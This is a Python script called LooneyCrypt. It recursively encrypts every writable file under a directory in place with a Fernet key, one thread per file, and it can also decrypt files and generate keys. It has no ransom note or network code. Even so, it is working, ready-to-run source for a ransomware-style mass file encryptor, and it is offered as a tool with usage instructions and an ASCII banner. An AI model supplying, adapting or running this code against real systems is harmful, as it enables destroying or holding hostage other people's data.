from cryptography.fernet import Fernet
from threading import Thread
import os
import sys


KEY = b""


def read_bytes_from_file(file_to_read):
    with open(file_to_read, "rb") as f_read:
        return f_read.read()


def write_bytes_to_file(data, file):
    with open(file, "wb") as f_write:
        f_write.write(data)


def is_already_decrypted(path):
    try:
        data = read_bytes_from_file(path)
        Fernet(KEY).decrypt(data)
        return True
    except:
        return False


def encrypt_files_recursive(root_dir):
    print("[INFO]\trecursive encryption started at: {}".format(root_dir))
    for root, dirs, files in os.walk(root_dir):
        for f in files:
            path = root + "/" + f
            t = Thread(target=encrypt_file, args=(path,))
            t.start()


def encrypt_file(path):
    if os.access(path, os.W_OK):
        if not is_already_decrypted(path):
            data = read_bytes_from_file(path)
            write_bytes_to_file(Fernet(KEY).encrypt(data), path)
            print("[INFO]\tsuccessfully encrypted file: {}".format(path))
        else:
            print("[WARN]\talready encrypted, {} will be skipped".format(path))


def decrypt_files_recursive(root_dir):
    print("[INFO]\trecursive decryption started at: {}".format(root_dir))
    for root, dirs, files in os.walk(root_dir):
        for f in files:
            path = root + "/" + f
            t = Thread(target=decrypt_file, args=(path,))
            t.start()


def decrypt_file(path):
    if os.access(path, os.W_OK):
        if os.access(path, os.W_OK):
            try:
                if is_already_decrypted(path):
                    data = read_bytes_from_file(path)
                    write_bytes_to_file(Fernet(KEY).decrypt(data), path)
                    print("[INFO]\tsuccessfully decrypted file: {}".format(path))
                else:
                    print("[WARN]\tfile is not encrypted, {} will be skipped".format(path))
            except:
                print("[ERROR]\tcould not decrypt {}".format(path))


def print_usage():
    print("\n".join([
        "USAGE: python LooneyCrypt.py",
        "\t-e root_dir_to_encrypt key : encrypt files recursive",
        "\t-d root_dir_to_decrypt key : decrypt files recursive",
        "\t-k                         : generates a new key"]))

def print_header():
    header = [
    "      ___       ___           ___           ___           ___           ___           ___           ___           ___           ___           ___      ",
    "     /\__\     /\  \         /\  \         /\__\         /\  \         |\__\         /\  \         /\  \         |\__\         /\  \         /\  \     ",
    "    /:/  /    /::\  \       /::\  \       /::|  |       /::\  \        |:|  |       /::\  \       /::\  \        |:|  |       /::\  \        \:\  \    ",
    "   /:/  /    /:/\:\  \     /:/\:\  \     /:|:|  |      /:/\:\  \       |:|  |      /:/\:\  \     /:/\:\  \       |:|  |      /:/\:\  \        \:\  \   ",
    "  /:/  /    /:/  \:\  \   /:/  \:\  \   /:/|:|  |__   /::\~\:\  \      |:|__|__   /:/  \:\  \   /::\~\:\  \      |:|__|__   /::\~\:\  \       /::\  \  ",
    " /:/__/    /:/__/ \:\__\ /:/__/ \:\__\ /:/ |:| /\__\ /:/\:\ \:\__\     /::::\__\ /:/__/ \:\__\ /:/\:\ \:\__\     /::::\__\ /:/\:\ \:\__\     /:/\:\__\ ",
    " \:\  \    \:\  \ /:/  / \:\  \ /:/  / \/__|:|/:/  / \:\~\:\ \/__/    /:/~~/~    \:\  \  \/__/ \/_|::\/:/  /    /:/~~/~    \/__\:\/:/  /    /:/  \/__/ ",
    "  \:\  \    \:\  /:/  /   \:\  /:/  /      |:/:/  /   \:\ \:\__\     /:/  /       \:\  \          |:|::/  /    /:/  /           \::/  /    /:/  /      ",
    "   \:\  \    \:\/:/  /     \:\/:/  /       |::/  /     \:\ \/__/     \/__/         \:\  \         |:|\/__/     \/__/             \/__/     \/__/       ",
    "    \:\__\    \::/  /       \::/  /        /:/  /       \:\__\                      \:\__\        |:|  |                                               ",
    "     \/__/     \/__/         \/__/         \/__/         \/__/                       \/__/         \|__|                                               "]
    print("\n".join(header) + "\n")


if __name__ == '__main__':
    print_header()
    try:
        if sys.argv[1].lower() == "-k":
            print("key={}".format(Fernet.generate_key().decode()))
        else:
            KEY = sys.argv[3].encode()
            if sys.argv[1].lower() == "-e":
                encrypt_files_recursive(sys.argv[2])
            elif sys.argv[1].lower() == "-d":
                decrypt_files_recursive(sys.argv[2])
    except:
        print_usage()
